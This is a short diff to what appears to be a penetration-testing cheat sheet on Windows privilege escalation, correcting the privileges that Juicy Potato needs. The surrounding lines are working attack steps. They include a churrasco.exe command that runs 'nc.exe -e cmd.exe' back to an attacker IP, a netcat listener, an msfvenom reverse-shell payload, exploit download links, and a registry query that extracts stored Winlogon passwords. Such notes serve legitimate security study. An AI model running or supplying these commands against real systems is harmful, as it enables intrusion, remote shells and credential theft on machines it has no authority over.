@@ -229,7 +229,7 @@ Password Protected SSH Private Key:
 			- Get nc.exe and churrasco.exe on the victim machine
 			- C:\temp\churrasco.exe "C:\\temp\\nc.exe -e cmd.exe 10.10.XX.XX 1337"
 		- Juicy Potato
-			- SeImpersonatePrivilege and seAssignPrimaryTokenPrivilege needs to be enabled: whoami /priv
+			- SeImpersonatePrivilege or seAssignPrimaryTokenPrivilege need to be enabled: whoami /priv
 			- Download the exe: https://github.com/ohpe/juicy-potato/releases/tag/v0.1
 			- On the attacker machine listen on a port of you choosing: nc -lnvp 1337
 			- on the vicitm machine: 
@@ -240,7 +240,7 @@ Password Protected SSH Private Key:
 			- reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
 
 		- Juicy potato alternative method: 
-			- SeImpersonatePrivilege and seAssignPrimaryTokenPrivilege needs to be enabled: whoami /priv
+			- SeImpersonatePrivilege or seAssignPrimaryTokenPrivilege needs to be enabled: whoami /priv
 			- systeminfo shows system is 32bits
 			- Download juicypotato x86: https://github.com/ivanitlearning/Juicy-Potato-x86/releases
 			- Create a reverse shell: msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=1337 -f exe > shell.exe
